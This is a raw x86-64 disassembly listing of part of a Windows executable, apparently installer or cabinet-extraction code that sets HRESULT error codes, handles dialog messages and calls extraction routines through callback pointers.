   14000481c:	e8 b7 1b 00 00       	call   0x1400063d8
   140004821:	48 8b 0d 48 a9 00 00 	mov    0xa948(%rip),%rcx        # 0x14000f170
   140004828:	48 ff 15 29 6b 00 00 	rex.W call *0x6b29(%rip)        # 0x14000b358
   14000482f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004834:	c7 05 46 ae 00 00 14 	movl   $0x80070714,0xae46(%rip)        # 0x14000f684
   14000483b:	07 07 80 
   14000483e:	eb a6                	jmp    0x1400047e6
   140004840:	48 8b 0d 29 a9 00 00 	mov    0xa929(%rip),%rcx        # 0x14000f170
   140004847:	48 8d 15 82 72 00 00 	lea    0x7282(%rip),%rdx        # 0x14000bad0
   14000484e:	48 ff 15 73 6b 00 00 	rex.W call *0x6b73(%rip)        # 0x14000b3c8
   140004855:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000485a:	85 c0                	test   %eax,%eax
   14000485c:	74 4a                	je     0x1400048a8
   14000485e:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140004864:	4c 8d 0d e5 19 00 00 	lea    0x19e5(%rip),%r9        # 0x140006250
   14000486b:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004871:	45 33 c0             	xor    %r8d,%r8d
   140004874:	ba d1 07 00 00       	mov    $0x7d1,%edx
   140004879:	e8 22 1e 00 00       	call   0x1400066a0
   14000487e:	48 8b 0d eb a8 00 00 	mov    0xa8eb(%rip),%rcx        # 0x14000f170
   140004885:	48 8b d8             	mov    %rax,%rbx
   140004888:	48 ff 15 c9 6a 00 00 	rex.W call *0x6ac9(%rip)        # 0x14000b358
   14000488f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004894:	48 85 db             	test   %rbx,%rbx
   140004897:	75 22                	jne    0x1400048bb
   140004899:	c7 05 e1 ad 00 00 c7 	movl   $0x800704c7,0xade1(%rip)        # 0x14000f684
   1400048a0:	04 07 80 
   1400048a3:	e9 3e ff ff ff       	jmp    0x1400047e6
   1400048a8:	48 8b 0d c1 a8 00 00 	mov    0xa8c1(%rip),%rcx        # 0x14000f170
   1400048af:	48 ff 15 a2 6a 00 00 	rex.W call *0x6aa2(%rip)        # 0x14000b358
   1400048b6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400048bb:	83 25 c2 ad 00 00 00 	andl   $0x0,0xadc2(%rip)        # 0x14000f684
   1400048c2:	b8 01 00 00 00       	mov    $0x1,%eax
   1400048c7:	48 83 c4 30          	add    $0x30,%rsp
   1400048cb:	5b                   	pop    %rbx
   1400048cc:	c3                   	ret
   1400048cd:	cc                   	int3
   1400048ce:	cc                   	int3
   1400048cf:	cc                   	int3
   1400048d0:	cc                   	int3
   1400048d1:	cc                   	int3
   1400048d2:	cc                   	int3
   1400048d3:	cc                   	int3
   1400048d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400048d9:	57                   	push   %rdi
   1400048da:	48 81 ec 60 02 00 00 	sub    $0x260,%rsp
   1400048e1:	48 8b 05 98 97 00 00 	mov    0x9798(%rip),%rax        # 0x14000e080
   1400048e8:	48 33 c4             	xor    %rsp,%rax
   1400048eb:	48 89 84 24 50 02 00 	mov    %rax,0x250(%rsp)
   1400048f2:	00 
   1400048f3:	33 ff                	xor    %edi,%edi
   1400048f5:	66 39 3d 5c a5 00 00 	cmp    %di,0xa55c(%rip)        # 0x14000ee58
   1400048fc:	75 2b                	jne    0x140004929
   1400048fe:	39 3d 40 a5 00 00    	cmp    %edi,0xa540(%rip)        # 0x14000ee44
   140004904:	75 16                	jne    0x14000491c
   140004906:	e8 b9 0f 00 00       	call   0x1400058c4
   14000490b:	85 c0                	test   %eax,%eax
   14000490d:	0f 84 0a 01 00 00    	je     0x140004a1d
   140004913:	66 39 3d 3e a5 00 00 	cmp    %di,0xa53e(%rip)        # 0x14000ee58
   14000491a:	75 0d                	jne    0x140004929
   14000491c:	e8 63 fe ff ff       	call   0x140004784
   140004921:	85 c0                	test   %eax,%eax
   140004923:	0f 84 f4 00 00 00    	je     0x140004a1d
   140004929:	e8 f6 07 00 00       	call   0x140005124
   14000492e:	85 c0                	test   %eax,%eax
   140004930:	0f 84 e7 00 00 00    	je     0x140004a1d
   140004936:	e8 ed 0a 00 00       	call   0x140005428
   14000493b:	85 c0                	test   %eax,%eax
   14000493d:	0f 84 da 00 00 00    	je     0x140004a1d
   140004943:	bb 05 01 00 00       	mov    $0x105,%ebx
   140004948:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000494d:	8b d3                	mov    %ebx,%edx
   14000494f:	48 ff 15 a2 69 00 00 	rex.W call *0x69a2(%rip)        # 0x14000b2f8
   140004956:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000495b:	4c 8d 05 d6 6e 00 00 	lea    0x6ed6(%rip),%r8        # 0x14000b838
   140004962:	8b d3                	mov    %ebx,%edx
   140004964:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004969:	e8 6e 4c 00 00       	call   0x1400095dc
   14000496e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004973:	48 ff 15 86 69 00 00 	rex.W call *0x6986(%rip)        # 0x14000b300
   14000497a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000497f:	48 8b d8             	mov    %rax,%rbx
   140004982:	48 85 c0             	test   %rax,%rax
   140004985:	74 29                	je     0x1400049b0
   140004987:	48 8d 15 2a 71 00 00 	lea    0x712a(%rip),%rdx        # 0x14000bab8
   14000498e:	48 8b c8             	mov    %rax,%rcx
   140004991:	48 ff 15 b0 69 00 00 	rex.W call *0x69b0(%rip)        # 0x14000b348
   140004998:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000499d:	48 85 c0             	test   %rax,%rax
   1400049a0:	74 0e                	je     0x1400049b0
   1400049a2:	33 d2                	xor    %edx,%edx
   1400049a4:	48 8d 0d a5 ad 00 00 	lea    0xada5(%rip),%rcx        # 0x14000f750
   1400049ab:	e8 60 56 00 00       	call   0x14000a010
   1400049b0:	48 8b cb             	mov    %rbx,%rcx
   1400049b3:	48 ff 15 ae 69 00 00 	rex.W call *0x69ae(%rip)        # 0x14000b368
   1400049ba:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400049bf:	39 3d 7f a4 00 00    	cmp    %edi,0xa47f(%rip)        # 0x14000ee44
   1400049c5:	0f 85 8f 00 00 00    	jne    0x140004a5a
   1400049cb:	39 3d cf b5 00 00    	cmp    %edi,0xb5cf(%rip)        # 0x14000ffa0
   1400049d1:	0f 85 83 00 00 00    	jne    0x140004a5a
   1400049d7:	ba 04 01 00 00       	mov    $0x104,%edx
   1400049dc:	48 8d 8c 24 40 01 00 	lea    0x140(%rsp),%rcx
   1400049e3:	00 
   1400049e4:	48 ff 15 4d 69 00 00 	rex.W call *0x694d(%rip)        # 0x14000b338
   1400049eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400049f0:	85 c0                	test   %eax,%eax
   1400049f2:	75 4d                	jne    0x140004a41
   1400049f4:	ba f0 04 00 00       	mov    $0x4f0,%edx
   1400049f9:	45 33 c9             	xor    %r9d,%r9d
   1400049fc:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140004a00:	45 33 c0             	xor    %r8d,%r8d
   140004a03:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004a0a:	00 
   140004a0b:	33 c9                	xor    %ecx,%ecx
   140004a0d:	e8 c6 19 00 00       	call   0x1400063d8
   140004a12:	e8 69 1d 00 00       	call   0x140006780
   140004a17:	89 05 67 ac 00 00    	mov    %eax,0xac67(%rip)        # 0x14000f684
   140004a1d:	33 c0                	xor    %eax,%eax
   140004a1f:	48 8b 8c 24 50 02 00 	mov    0x250(%rsp),%rcx
   140004a26:	00 
   140004a27:	48 33 cc             	xor    %rsp,%rcx
   140004a2a:	e8 81 51 00 00       	call   0x140009bb0
   140004a2f:	48 8b 9c 24 70 02 00 	mov    0x270(%rsp),%rbx
   140004a36:	00 
   140004a37:	48 81 c4 60 02 00 00 	add    $0x260,%rsp
   140004a3e:	5f                   	pop    %rdi
   140004a3f:	c3                   	ret
   140004a40:	cc                   	int3
   140004a41:	ba 02 00 00 00       	mov    $0x2,%edx
   140004a46:	48 8d 8c 24 40 01 00 	lea    0x140(%rsp),%rcx
   140004a4d:	00 
   140004a4e:	44 8b c2             	mov    %edx,%r8d
   140004a51:	e8 f6 12 00 00       	call   0x140005d4c
   140004a56:	85 c0                	test   %eax,%eax
   140004a58:	74 c3                	je     0x140004a1d
   140004a5a:	48 8d 0d ef ac 00 00 	lea    0xacef(%rip),%rcx        # 0x14000f750
   140004a61:	48 ff 15 a8 69 00 00 	rex.W call *0x69a8(%rip)        # 0x14000b410
   140004a68:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004a6d:	85 c0                	test   %eax,%eax
   140004a6f:	75 07                	jne    0x140004a78
   140004a71:	ba bc 04 00 00       	mov    $0x4bc,%edx
   140004a76:	eb 81                	jmp    0x1400049f9
   140004a78:	39 3d ce a3 00 00    	cmp    %edi,0xa3ce(%rip)        # 0x14000ee4c
   140004a7e:	75 78                	jne    0x140004af8
   140004a80:	48 8d 05 f9 a6 00 00 	lea    0xa6f9(%rip),%rax        # 0x14000f180
   140004a87:	b9 28 00 00 00       	mov    $0x28,%ecx
   140004a8c:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140004a92:	48 8d 40 20          	lea    0x20(%rax),%rax
   140004a96:	48 83 e9 01          	sub    $0x1,%rcx
   140004a9a:	75 f0                	jne    0x140004a8c
   140004a9c:	f6 05 b5 a3 00 00 01 	testb  $0x1,0xa3b5(%rip)        # 0x14000ee58
   140004aa3:	75 6f                	jne    0x140004b14
   140004aa5:	f6 05 f8 b4 00 00 01 	testb  $0x1,0xb4f8(%rip)        # 0x14000ffa4
   140004aac:	75 66                	jne    0x140004b14
   140004aae:	8b 05 a8 97 00 00    	mov    0x97a8(%rip),%eax        # 0x14000e25c
   140004ab4:	4c 8d 0d c5 00 00 00 	lea    0xc5(%rip),%r9        # 0x140004b80
   140004abb:	f7 d8                	neg    %eax
   140004abd:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140004ac2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004ac7:	48 1b d2             	sbb    %rdx,%rdx
   140004aca:	45 33 c0             	xor    %r8d,%r8d
   140004acd:	48 81 c2 d5 07 00 00 	add    $0x7d5,%rdx
   140004ad4:	e8 c7 1b 00 00       	call   0x1400066a0
   140004ad9:	48 85 c0             	test   %rax,%rax
   140004adc:	74 3f                	je     0x140004b1d
   140004ade:	48 8d 0d eb 25 00 00 	lea    0x25eb(%rip),%rcx        # 0x1400070d0
   140004ae5:	e8 7e 33 00 00       	call   0x140007e68
   140004aea:	85 c0                	test   %eax,%eax
   140004aec:	0f 84 2b ff ff ff    	je     0x140004a1d
   140004af2:	89 3d 8c ab 00 00    	mov    %edi,0xab8c(%rip)        # 0x14000f684
   140004af8:	8b 05 6a a6 00 00    	mov    0xa66a(%rip),%eax        # 0x14000f168
   140004afe:	a8 40                	test   $0x40,%al
   140004b00:	75 2a                	jne    0x140004b2c
   140004b02:	84 c0                	test   %al,%al
   140004b04:	78 26                	js     0x140004b2c
   140004b06:	0f b7 0d ab b4 00 00 	movzwl 0xb4ab(%rip),%ecx        # 0x14000ffb8
   140004b0d:	e8 a2 eb ff ff       	call   0x1400036b4
   140004b12:	eb 1a                	jmp    0x140004b2e
   140004b14:	e8 97 02 00 00       	call   0x140004db0
   140004b19:	85 c0                	test   %eax,%eax
   140004b1b:	75 c1                	jne    0x140004ade
   140004b1d:	c7 05 5d ab 00 00 2b 	movl   $0x8007042b,0xab5d(%rip)        # 0x14000f684
   140004b24:	04 07 80 
   140004b27:	e9 f1 fe ff ff       	jmp    0x140004a1d
   140004b2c:	8b c7                	mov    %edi,%eax
   140004b2e:	89 05 88 b4 00 00    	mov    %eax,0xb488(%rip)        # 0x14000ffbc
   140004b34:	8b 05 0a a3 00 00    	mov    0xa30a(%rip),%eax        # 0x14000ee44
   140004b3a:	85 c0                	test   %eax,%eax
   140004b3c:	75 1b                	jne    0x140004b59
   140004b3e:	39 3d 5c b4 00 00    	cmp    %edi,0xb45c(%rip)        # 0x14000ffa0
   140004b44:	75 13                	jne    0x140004b59
   140004b46:	e8 61 29 00 00       	call   0x1400074ac
   140004b4b:	85 c0                	test   %eax,%eax
   140004b4d:	0f 84 ca fe ff ff    	je     0x140004a1d
   140004b53:	8b 05 eb a2 00 00    	mov    0xa2eb(%rip),%eax        # 0x14000ee44
   140004b59:	66 39 3d f8 a2 00 00 	cmp    %di,0xa2f8(%rip)        # 0x14000ee58
   140004b60:	75 09                	jne    0x140004b6b
   140004b62:	85 c0                	test   %eax,%eax
   140004b64:	75 05                	jne    0x140004b6b
   140004b66:	e8 d5 04 00 00       	call   0x140005040
   140004b6b:	b8 01 00 00 00       	mov    $0x1,%eax
   140004b70:	e9 aa fe ff ff       	jmp    0x140004a1f
   140004b75:	cc                   	int3
   140004b76:	cc                   	int3
   140004b77:	cc                   	int3
   140004b78:	cc                   	int3
   140004b79:	cc                   	int3
   140004b7a:	cc                   	int3
   140004b7b:	cc                   	int3
   140004b7c:	cc                   	int3
   140004b7d:	cc                   	int3
   140004b7e:	cc                   	int3
   140004b7f:	cc                   	int3
   140004b80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004b85:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004b8a:	57                   	push   %rdi
   140004b8b:	48 83 ec 30          	sub    $0x30,%rsp
   140004b8f:	49 8b f0             	mov    %r8,%rsi
   140004b92:	48 8b f9             	mov    %rcx,%rdi
   140004b95:	bb 01 00 00 00       	mov    $0x1,%ebx
   140004b9a:	83 ea 10             	sub    $0x10,%edx
   140004b9d:	0f 84 df 01 00 00    	je     0x140004d82
   140004ba3:	81 ea f2 00 00 00    	sub    $0xf2,%edx
   140004ba9:	0f 84 cd 01 00 00    	je     0x140004d7c
   140004baf:	83 ea 0e             	sub    $0xe,%edx
   140004bb2:	0f 84 c9 00 00 00    	je     0x140004c81
   140004bb8:	2b d3                	sub    %ebx,%edx
   140004bba:	74 2f                	je     0x140004beb
   140004bbc:	81 fa 90 0e 00 00    	cmp    $0xe90,%edx
   140004bc2:	74 07                	je     0x140004bcb
   140004bc4:	33 c0                	xor    %eax,%eax
   140004bc6:	e9 ce 01 00 00       	jmp    0x140004d99
   140004bcb:	48 8b 0d c6 9f 00 00 	mov    0x9fc6(%rip),%rcx        # 0x14000eb98
   140004bd2:	33 d2                	xor    %edx,%edx
   140004bd4:	48 ff 15 5d 68 00 00 	rex.W call *0x685d(%rip)        # 0x14000b438
   140004bdb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004be0:	48 63 d6             	movslq %esi,%rdx
   140004be3:	48 8b cf             	mov    %rdi,%rcx
   140004be6:	e9 9f 01 00 00       	jmp    0x140004d8a
   140004beb:	48 83 fe 02          	cmp    $0x2,%rsi
   140004bef:	0f 85 a1 01 00 00    	jne    0x140004d96
   140004bf5:	48 8b 0d 34 9d 00 00 	mov    0x9d34(%rip),%rcx        # 0x14000e930
   140004bfc:	48 ff 15 5d 68 00 00 	rex.W call *0x685d(%rip)        # 0x14000b460
   140004c03:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004c08:	48 8b 0d d9 9c 00 00 	mov    0x9cd9(%rip),%rcx        # 0x14000e8e8
   140004c0f:	4c 8d 05 1a 6c 00 00 	lea    0x6c1a(%rip),%r8        # 0x14000b830
   140004c16:	45 33 c9             	xor    %r9d,%r9d
   140004c19:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140004c20:	00 
   140004c21:	ba b2 04 00 00       	mov    $0x4b2,%edx
   140004c26:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   140004c2d:	00 
   140004c2e:	e8 a5 17 00 00       	call   0x1400063d8
   140004c33:	83 f8 06             	cmp    $0x6,%eax
   140004c36:	74 1c                	je     0x140004c54
   140004c38:	3b c3                	cmp    %ebx,%eax
   140004c3a:	74 18                	je     0x140004c54
   140004c3c:	48 8b 0d ed 9c 00 00 	mov    0x9ced(%rip),%rcx        # 0x14000e930
   140004c43:	48 ff 15 e6 67 00 00 	rex.W call *0x67e6(%rip)        # 0x14000b430
   140004c4a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004c4f:	e9 42 01 00 00       	jmp    0x140004d96
   140004c54:	48 8b 0d d5 9c 00 00 	mov    0x9cd5(%rip),%rcx        # 0x14000e930
   140004c5b:	89 1d db aa 00 00    	mov    %ebx,0xaadb(%rip)        # 0x14000f73c
   140004c61:	48 ff 15 c8 67 00 00 	rex.W call *0x67c8(%rip)        # 0x14000b430
   140004c68:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004c6d:	48 8b 0d 24 9f 00 00 	mov    0x9f24(%rip),%rcx        # 0x14000eb98
   140004c74:	e8 8f 35 00 00       	call   0x140008208
   140004c79:	48 8b cf             	mov    %rdi,%rcx
   140004c7c:	e9 07 01 00 00       	jmp    0x140004d88
   140004c81:	48 89 3d 60 9c 00 00 	mov    %rdi,0x9c60(%rip)        # 0x14000e8e8
   140004c88:	48 ff 15 31 69 00 00 	rex.W call *0x6931(%rip)        # 0x14000b5c0
   140004c8f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004c94:	48 8b d0             	mov    %rax,%rdx
   140004c97:	48 8b cf             	mov    %rdi,%rcx
   140004c9a:	e8 89 f1 ff ff       	call   0x140003e28
   140004c9f:	83 3d b6 95 00 00 00 	cmpl   $0x0,0x95b6(%rip)        # 0x14000e25c
   140004ca6:	74 63                	je     0x140004d0b
   140004ca8:	be 3b 08 00 00       	mov    $0x83b,%esi
   140004cad:	48 8b cf             	mov    %rdi,%rcx
   140004cb0:	8b d6                	mov    %esi,%edx
   140004cb2:	48 ff 15 7f 69 00 00 	rex.W call *0x697f(%rip)        # 0x14000b638
   140004cb9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004cbe:	41 b9 b9 0b 00 00    	mov    $0xbb9,%r9d
   140004cc4:	45 33 c0             	xor    %r8d,%r8d
   140004cc7:	48 8b c8             	mov    %rax,%rcx
   140004cca:	ba 64 04 00 00       	mov    $0x464,%edx
   140004ccf:	48 ff 15 6a 69 00 00 	rex.W call *0x696a(%rip)        # 0x14000b640
   140004cd6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004cdb:	8b d6                	mov    %esi,%edx
   140004cdd:	48 8b cf             	mov    %rdi,%rcx
   140004ce0:	48 ff 15 51 69 00 00 	rex.W call *0x6951(%rip)        # 0x14000b638
   140004ce7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004cec:	49 c7 c1 00 00 ff ff 	mov    $0xffffffffffff0000,%r9
   140004cf3:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   140004cf7:	48 8b c8             	mov    %rax,%rcx
   140004cfa:	ba 65 04 00 00       	mov    $0x465,%edx
   140004cff:	48 ff 15 3a 69 00 00 	rex.W call *0x693a(%rip)        # 0x14000b640
   140004d06:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d0b:	48 8d 15 a6 a9 00 00 	lea    0xa9a6(%rip),%rdx        # 0x14000f6b8
   140004d12:	48 8b cf             	mov    %rdi,%rcx
   140004d15:	48 ff 15 3c 69 00 00 	rex.W call *0x693c(%rip)        # 0x14000b658
   140004d1c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d21:	48 8d 05 68 9e 00 00 	lea    0x9e68(%rip),%rax        # 0x14000eb90
   140004d28:	45 33 c9             	xor    %r9d,%r9d
   140004d2b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004d30:	4c 8d 05 79 00 00 00 	lea    0x79(%rip),%r8        # 0x140004db0
   140004d37:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   140004d3c:	33 d2                	xor    %edx,%edx
   140004d3e:	33 c9                	xor    %ecx,%ecx
   140004d40:	48 ff 15 11 67 00 00 	rex.W call *0x6711(%rip)        # 0x14000b458
   140004d47:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d4c:	48 89 05 45 9e 00 00 	mov    %rax,0x9e45(%rip)        # 0x14000eb98
   140004d53:	48 85 c0             	test   %rax,%rax
   140004d56:	75 3e                	jne    0x140004d96
   140004d58:	21 44 24 28          	and    %eax,0x28(%rsp)
   140004d5c:	45 33 c9             	xor    %r9d,%r9d
   140004d5f:	45 33 c0             	xor    %r8d,%r8d
   140004d62:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004d69:	00 
   140004d6a:	ba b8 04 00 00       	mov    $0x4b8,%edx
   140004d6f:	48 8b cf             	mov    %rdi,%rcx
   140004d72:	e8 61 16 00 00       	call   0x1400063d8
   140004d77:	e9 fd fe ff ff       	jmp    0x140004c79
   140004d7c:	48 83 fe 1b          	cmp    $0x1b,%rsi
   140004d80:	75 14                	jne    0x140004d96
   140004d82:	89 1d b4 a9 00 00    	mov    %ebx,0xa9b4(%rip)        # 0x14000f73c
   140004d88:	33 d2                	xor    %edx,%edx
   140004d8a:	48 ff 15 57 68 00 00 	rex.W call *0x6857(%rip)        # 0x14000b5e8
   140004d91:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d96:	48 8b c3             	mov    %rbx,%rax
   140004d99:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004d9e:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140004da3:	48 83 c4 30          	add    $0x30,%rsp
   140004da7:	5f                   	pop    %rdi
   140004da8:	c3                   	ret
   140004da9:	cc                   	int3
   140004daa:	cc                   	int3
   140004dab:	cc                   	int3
   140004dac:	cc                   	int3
   140004dad:	cc                   	int3
   140004dae:	cc                   	int3
   140004daf:	cc                   	int3
   140004db0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004db5:	57                   	push   %rdi
   140004db6:	48 83 ec 50          	sub    $0x50,%rsp
   140004dba:	45 33 c0             	xor    %r8d,%r8d
   140004dbd:	48 8d 0d b4 6d 00 00 	lea    0x6db4(%rip),%rcx        # 0x14000bb78
   140004dc4:	33 d2                	xor    %edx,%edx
   140004dc6:	e8 81 05 00 00       	call   0x14000534c
   140004dcb:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140004dd1:	89 05 d1 a8 00 00    	mov    %eax,0xa8d1(%rip)        # 0x14000f6a8
   140004dd7:	48 8d 15 9a 6d 00 00 	lea    0x6d9a(%rip),%rdx        # 0x14000bb78
   140004dde:	33 c9                	xor    %ecx,%ecx
   140004de0:	48 ff 15 f1 65 00 00 	rex.W call *0x65f1(%rip)        # 0x14000b3d8
   140004de7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004dec:	48 8b d0             	mov    %rax,%rdx
   140004def:	33 c9                	xor    %ecx,%ecx
   140004df1:	48 ff 15 70 66 00 00 	rex.W call *0x6670(%rip)        # 0x14000b468
   140004df8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004dfd:	48 8b c8             	mov    %rax,%rcx
   140004e00:	48 ff 15 41 66 00 00 	rex.W call *0x6641(%rip)        # 0x14000b448
   140004e07:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e0c:	48 89 05 8d a8 00 00 	mov    %rax,0xa88d(%rip)        # 0x14000f6a0
   140004e13:	48 85 c0             	test   %rax,%rax
   140004e16:	0f 84 d5 01 00 00    	je     0x140004ff1
   140004e1c:	48 8b 0d c5 9a 00 00 	mov    0x9ac5(%rip),%rcx        # 0x14000e8e8
   140004e23:	48 85 c9             	test   %rcx,%rcx
   140004e26:	74 4e                	je     0x140004e76
   140004e28:	ba 42 08 00 00       	mov    $0x842,%edx
   140004e2d:	48 ff 15 04 68 00 00 	rex.W call *0x6804(%rip)        # 0x14000b638
   140004e34:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e39:	48 8b c8             	mov    %rax,%rcx
   140004e3c:	33 d2                	xor    %edx,%edx
   140004e3e:	48 ff 15 6b 67 00 00 	rex.W call *0x676b(%rip)        # 0x14000b5b0
   140004e45:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e4a:	48 8b 0d 97 9a 00 00 	mov    0x9a97(%rip),%rcx        # 0x14000e8e8
   140004e51:	ba 41 08 00 00       	mov    $0x841,%edx
   140004e56:	48 ff 15 db 67 00 00 	rex.W call *0x67db(%rip)        # 0x14000b638
   140004e5d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e62:	48 8b c8             	mov    %rax,%rcx
   140004e65:	ba 05 00 00 00       	mov    $0x5,%edx
   140004e6a:	48 ff 15 3f 67 00 00 	rex.W call *0x673f(%rip)        # 0x14000b5b0
   140004e71:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e76:	e8 55 32 00 00       	call   0x1400080d0
   140004e7b:	85 c0                	test   %eax,%eax
   140004e7d:	75 0a                	jne    0x140004e89
   140004e7f:	ba ba 04 00 00       	mov    $0x4ba,%edx
   140004e84:	e9 cb 00 00 00       	jmp    0x140004f54
   140004e89:	48 8d 05 1c a8 00 00 	lea    0xa81c(%rip),%rax        # 0x14000f6ac
   140004e90:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004e95:	4c 8d 0d f4 3b 00 00 	lea    0x3bf4(%rip),%r9        # 0x140008a90
   140004e9c:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140004ea3:	00 
   140004ea4:	48 8d 05 95 3c 00 00 	lea    0x3c95(%rip),%rax        # 0x140008b40
   140004eab:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004eb0:	4c 8d 05 79 39 00 00 	lea    0x3979(%rip),%r8        # 0x140008830
   140004eb7:	48 8d 05 c2 36 00 00 	lea    0x36c2(%rip),%rax        # 0x140008580
   140004ebe:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004ec3:	48 8d 15 46 39 00 00 	lea    0x3946(%rip),%rdx        # 0x140008810
   140004eca:	48 8d 05 2f 46 00 00 	lea    0x462f(%rip),%rax        # 0x140009500
   140004ed1:	48 8d 0d 88 36 00 00 	lea    0x3688(%rip),%rcx        # 0x140008560
   140004ed8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004edd:	48 ff 15 b4 63 00 00 	rex.W call *0x63b4(%rip)        # 0x14000b298
   140004ee4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004ee9:	48 8b f8             	mov    %rax,%rdi
   140004eec:	48 85 c0             	test   %rax,%rax
   140004eef:	74 57                	je     0x140004f48
   140004ef1:	48 8d 05 a8 a7 00 00 	lea    0xa7a8(%rip),%rax        # 0x14000f6a0
   140004ef8:	45 33 c9             	xor    %r9d,%r9d
   140004efb:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004f00:	4c 8d 05 29 69 00 00 	lea    0x6929(%rip),%r8        # 0x14000b830
   140004f07:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140004f0d:	48 8d 05 dc 36 00 00 	lea    0x36dc(%rip),%rax        # 0x1400085f0
   140004f14:	48 8d 15 95 93 00 00 	lea    0x9395(%rip),%rdx        # 0x14000e2b0
   140004f1b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004f20:	48 8b cf             	mov    %rdi,%rcx
   140004f23:	48 ff 15 7e 63 00 00 	rex.W call *0x637e(%rip)        # 0x14000b2a8
   140004f2a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004f2f:	8b d8                	mov    %eax,%ebx
   140004f31:	85 c0                	test   %eax,%eax
   140004f33:	74 40                	je     0x140004f75
   140004f35:	48 8b cf             	mov    %rdi,%rcx
   140004f38:	48 ff 15 61 63 00 00 	rex.W call *0x6361(%rip)        # 0x14000b2a0
   140004f3f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004f44:	85 c0                	test   %eax,%eax
   140004f46:	75 2d                	jne    0x140004f75
